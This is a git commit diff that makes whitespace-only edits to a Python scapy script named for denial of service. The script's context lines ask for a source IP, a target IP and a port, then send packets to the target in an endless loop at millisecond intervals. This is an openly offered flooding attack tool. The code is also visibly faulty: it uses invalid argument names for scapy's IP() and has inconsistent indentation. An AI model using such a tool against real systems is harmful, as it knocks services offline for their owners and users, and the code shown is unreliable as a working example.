2c875fabcb589f7e71bde970bae9f95aaa45445c
fatinrohimi <48275204+fatinrohimi@users.noreply.github.com>
2020-07-12 13:26:02 +0800

    Update DoSsingleIPsinglePort.py

--- DoSsingleIPsinglePort.py
+++ DoSsingleIPsinglePort.py
@@ -2,7 +2,7 @@ from scapy.all import *
 source_IP = input("Enter IP address of Source: ")
 target_IP = input("Enter IP address of Target: ")
 source_port = int(input("Enter Source Port Number:"))
-i = 1
+i=1
 
 while True:
    IP1 = IP(source_IP = source_IP, destination = target_IP)
@@ -11,4 +11,4 @@ while True:
    send(pkt, inter = .001)
    
    print ("packet sent ", i)
-      i = i + 1
+      i=i + 1
